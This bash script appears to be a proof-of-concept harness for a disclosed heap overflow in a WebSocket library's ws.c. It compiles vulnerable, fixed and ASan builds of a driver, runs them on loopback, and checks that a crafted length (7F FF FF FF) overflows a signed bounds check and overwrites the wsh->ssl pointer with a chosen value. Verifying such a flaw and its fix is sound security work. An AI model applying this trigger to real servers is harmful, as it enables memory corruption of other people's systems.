#!/usr/bin/env bash
# Positive-extended-length path against the UNMODIFIED upstream ws.c.
# Length bytes 7F FF FF FF make plen=INT_MAX; the guard's signed add overflows
# and ws_raw_read performs a byte-faithful copy of sender bytes.
# All traffic stays on 127.0.0.1; no off-loopback probe.
set -u
cd "$(dirname "$0")" || exit 2
mkdir -p logs

echo "=== pinned digests (unmodified upstream sources) ==="
sha256sum ws/ws.c ws/ws.h ws/ws_fixed.c driver_pos.c

gcc -g -O0 -I ws -o live_pos_plain driver_pos.c ws/ws.c -lssl -lcrypto -lpthread 2>/dev/null || exit 2
gcc -g -O0 -I ws -o live_pos_fixed driver_pos.c ws/ws_fixed.c -lssl -lcrypto -lpthread 2>/dev/null || exit 2
gcc -g -O0 -fsanitize=address -I ws -o live_pos_asan driver_pos.c ws/ws.c -lssl -lcrypto -lpthread 2>/dev/null || exit 2

echo "=== vulnerable source, plain, ptr (expect wsh->ssl == chosen) ==="
./live_pos_plain ptr 2>&1 | tee logs/pos_plain.txt
echo "plain_rc=${PIPESTATUS[0]}"
echo "ptr_check=$(grep -q 'RESULT=PASS' logs/pos_plain.txt && echo PASS || echo FAIL)"

echo "=== fixed source d557ca6d, plain, ptr (expect rc=-1009, ssl nil) ==="
./live_pos_fixed ptr 2>&1 | tee logs/pos_fixed.txt
echo "fixed_rc=${PIPESTATUS[0]}"
echo "fixed_check=$(grep -q 'rc=-1009' logs/pos_fixed.txt && grep -q 'ssl=(nil)' logs/pos_fixed.txt && echo PASS || echo FAIL)"

echo "=== vulnerable source, ASan, asan (expect heap-buffer-overflow WRITE) ==="
ASAN_OPTIONS=detect_leaks=0 ./live_pos_asan asan 2>&1 | tee logs/pos_asan.txt
echo "asan_rc=${PIPESTATUS[0]}"
echo "asan_check=$(grep -q 'heap-buffer-overflow' logs/pos_asan.txt && grep -q 'WRITE of size' logs/pos_asan.txt && echo PASS || echo FAIL)"
